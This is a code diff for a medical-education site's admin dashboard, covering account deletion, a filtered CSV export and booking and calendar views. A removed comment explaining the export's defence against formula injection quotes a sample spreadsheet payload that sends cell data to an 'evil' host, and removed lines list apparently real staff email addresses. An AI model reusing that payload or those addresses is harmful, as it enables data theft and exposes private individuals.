+        ${p.role === 'applicant' ? `<div class="aa-danger"><div><strong>Danger zone</strong><p>Permanently deletes this person's account, profile and QBank history. Their payment records stay in the ledger.</p></div>
+          <button class="admin-action-btn aa-btn-danger" onclick="deleteUserAccount('${escapeJs(uid)}', ${escapeAttr(JSON.stringify(name(p)))}, ${escapeAttr(JSON.stringify(p.email || ''))})">Delete account…</button></div>` : ''}
+      </div>`;
+      detailsRow.appendChild(td);
+      row.after(detailsRow);
+      function name(x) { return x.name || '(no name)'; }
     }
 
     // ===== Clean up orphan Firestore profile docs =====
@@ -7689,18 +8278,19 @@
 
     // ===== Export users to CSV =====
     function exportUsersCsv() {
-      if (!Array.isArray(allAdminUsers) || allAdminUsers.length === 0) {
-        alert('No users to export yet. Wait for the user list to load.');
+      const people = window._adminFilteredPeople;
+      if (!Array.isArray(people) || !Array.isArray(allAdminUsers) || allAdminUsers.length === 0) {
+        alert('No people to export yet. Wait for the list to load.');
         return;
       }
-
-      // CSV escape: wrap in double-quotes, double-up internal quotes,
-      // strip newlines so a single user row stays on one line. Also
-      // DEFUSE Excel/Sheets formula injection: any cell that begins with
-      // `=`, `+`, `-`, `@`, tab, or CR is prefixed with a single quote
-      // so Excel treats it as literal text instead of a formula. A user
-      // whose display name is `=HYPERLINK("http://evil/steal?u="&A2)`
-      // would otherwise execute when the admin opens the exported file.
+      if (people.length === 0) {
+        alert('Nobody matches the current view, search and filter, so there is nothing to export.');
+        return;
+      }
+      // CSV escape: wrap in double-quotes, double-up internal quotes, strip
+      // newlines, and DEFUSE spreadsheet formula injection: a cell starting
+      // with =, +, -, @, tab or CR is prefixed with ' so Excel/Sheets treat
+      // it as text (a display name like =HYPERLINK(...) would otherwise run).
       function csv(v) {
         if (v === null || v === undefined) return '';
         let s = String(v).replace(/\r?\n/g, ' ');
@@ -7708,56 +8298,15 @@
         s = s.replace(/"/g, '""');
         return '"' + s + '"';
       }
-
-      // Accept Firestore Timestamp, ms-since-epoch number, Date, ISO string.
-      function formatDate(d) {
-        if (!d && d !== 0) return '';
-        let date;
-        if (typeof d === 'number') date = new Date(d);
-        else if (d.toDate) date = d.toDate();
-        else date = new Date(d);
-        if (isNaN(date.getTime())) return '';
-        return date.toISOString().split('T')[0];   // YYYY-MM-DD
-      }
-
-      const headers = [
-        'Name', 'Email', 'Path', 'Country', 'Phone',
-        'Signed Up', 'Visits', 'Last Visit', 'QBank Plan', 'Last Active', 'User ID'
-      ];
-
-      // Path column in the CSV matches the table: admin / reviewer
-      // overrides take precedence over the raw `path` field so the
-      // exported file reads like the on-screen view.
-      const PATH_ADMIN_EMAILS_C = ['eli@shosmed.com', 'contact@shosmed.com', 'privacy@shosmed.com', 'elizolotov@gmail.com'];
-      const PATH_REVIEWER_EMAILS_C = ['jana.fauknerova@lf3.cuni.cz'];
-      function csvPathLabel(u) {
-        const e = (u.email || '').toLowerCase();
-        if (PATH_ADMIN_EMAILS_C.includes(e))    return 'admin';
-        if (PATH_REVIEWER_EMAILS_C.includes(e)) return 'reviewer';
-        return u.path || u.userType || '';
-      }
-
-      const rows = allAdminUsers.map(u => [
-        u.displayName || u.name || '',
-        u.email || '',
-        csvPathLabel(u),
-        u.country || '',
-        u.phone || '',
-        formatDate(u.createdAtMs ?? u.createdAt),
-        (typeof u.visitCount === 'number' ? u.visitCount : 0),
-        formatDate(u.lastVisitAt),
-        (u.payments && u.payments['exam-bank']) ? (u.payments['exam-bank-plan'] || 'paid') : 'free',
-        formatDate(u.lastActiveAt || u.lastLoginAt),
-        u.id || ''
-      ].map(csv).join(','));
-
-      const csvContent = '﻿' + [headers.map(csv).join(','), ...rows].join('\r\n');
+      // Exactly what is on screen: the current audience view, search and filter.
+      const table = SHOSAdmin.csvTable(people, adminView);
+      const csvContent = '\ufeff' + [table.headers.map(csv).join(','), ...table.rows.map(r => r.map(csv).join(','))].join('\r\n');
       const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8' });
       const url = URL.createObjectURL(blob);
       const stamp = new Date().toISOString().split('T')[0];
       const a = document.createElement('a');
       a.href = url;
-      a.download = `shos-med-users-${stamp}.csv`;
+      a.download = `shos-med-${adminView}-${stamp}.csv`;
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
@@ -7803,14 +8352,38 @@
 
       bookingsUnsubscribe = subscribeAdminBookings(statusFilter, bookings => {
         loadingEl.style.display = 'none';
-        listEl.innerHTML = '';
+        window._bookingsTabList = bookings;
+        paintBookings();
+      }, err => {
+        loadingEl.style.display = 'block';
+        loadingEl.textContent = 'Couldn\'t load bookings (' + ((err && err.code) || 'error') + ').';
+      });
+    }
 
-        if (bookings.length === 0) {
-          emptyEl.style.display = 'block';
-          return;
-        }
-        emptyEl.style.display = 'none';
-
+    function paintBookings() {
+      const listEl = document.getElementById('bookingsList');
+      const emptyEl = document.getElementById('bookingsEmpty');
+      const noteEl = document.getElementById('bookingAudienceNote');
+      const all = window._bookingsTabList;
+      if (!listEl || !Array.isArray(all)) return;
+      const audSel = document.getElementById('bookingAudienceFilter');
+      const aud = adminView === 'overview' && audSel ? audSel.value : 'all';
+      const bookings = all.filter(b => {
+        if (!SHOSAdmin.bookingInView(b, adminView)) return false;
+        return aud === 'all' || SHOSCatalog.bookingAudience(b).kind === aud;
+      });
+      if (noteEl) {
+        noteEl.textContent = adminView === 'overview'
+          ? 'All bookings. The Free Strategy Call is offered to both audiences, so it is marked Shared and appears only here.'
+          : 'Bookings for ' + ADMIN_VIEW_META[adminView].name + ' services. Shared services (Free Strategy Call) appear in Overview.';
+      }
+      listEl.innerHTML = '';
+      if (bookings.length === 0) {
+        emptyEl.style.display = 'block';
+        return;
+      }
+      emptyEl.style.display = 'none';
+      {
         bookings.forEach(bk => {
           const card = document.createElement('div');
           card.className = 'booking-card';
@@ -7867,6 +8440,7 @@
               <div>
                 <span class="booking-service">${escapeHtml(bk.serviceName || bk.serviceType)}</span>
                 <span class="status-badge status-${bk.status}" style="margin-left:8px;">${bk.status.replace('_', ' ')}</span>
+                ${adminView === 'overview' ? kindChip(SHOSCatalog.bookingAudience(bk).kind) : ''}
               </div>
               <span class="booking-price">${priceStr}</span>
             </div>
@@ -7884,10 +8458,11 @@
           card.addEventListener('click', () => card.classList.toggle('open'));
           listEl.appendChild(card);
         });
-      });   // close subscribeAdminBookings callback
+      }
     }
 
     document.getElementById('bookingStatusFilter')?.addEventListener('change', () => { adminBookingsLoaded = true; renderBookings(); });
+    document.getElementById('bookingAudienceFilter')?.addEventListener('change', () => paintBookings());
 
     async function changeBookingStatus(id, newStatus) {
       // onSnapshot will repaint automatically — explicit re-render unneeded.
@@ -7958,9 +8533,25 @@
       if (typeof calendarUnsubscribe === 'function') { calendarUnsubscribe(); calendarUnsubscribe = null; }
 
       calendarUnsubscribe = subscribeBookingsForMonth(calYear, calMonth, bookings => {
+        window._calAllBookings = bookings;
+        paintCalendar();
+      });
+    }
+
+    // Draw the month's booking dots for the current audience view.
+    function paintCalendar() {
+      const bookings = window._calAllBookings;
+      if (!Array.isArray(bookings)) return;
+      const noteEl = document.getElementById('calendarAudienceNote');
+      if (noteEl) {
+        noteEl.textContent = adminView === 'overview'
+          ? 'All bookings, including shared services.'
+          : 'Showing ' + ADMIN_VIEW_META[adminView].name + ' bookings only. Switch to Overview for everything, including shared services.';
+      }
+      {
         // Group by date
         const byDate = {};
-        bookings.forEach(bk => {
+        bookings.filter(bk => SHOSAdmin.bookingInView(bk, adminView)).forEach(bk => {
           if (!bk.preferredDate) return;
           if (!byDate[bk.preferredDate]) byDate[bk.preferredDate] = [];
           byDate[bk.preferredDate].push(bk);
@@ -7987,7 +8578,7 @@
         if (selectedCell && selectedCell.dataset.date) {
           showDayBookings(selectedCell.dataset.date);
         }
-      });
+      }
     }
 
     function showDayBookings(date) {
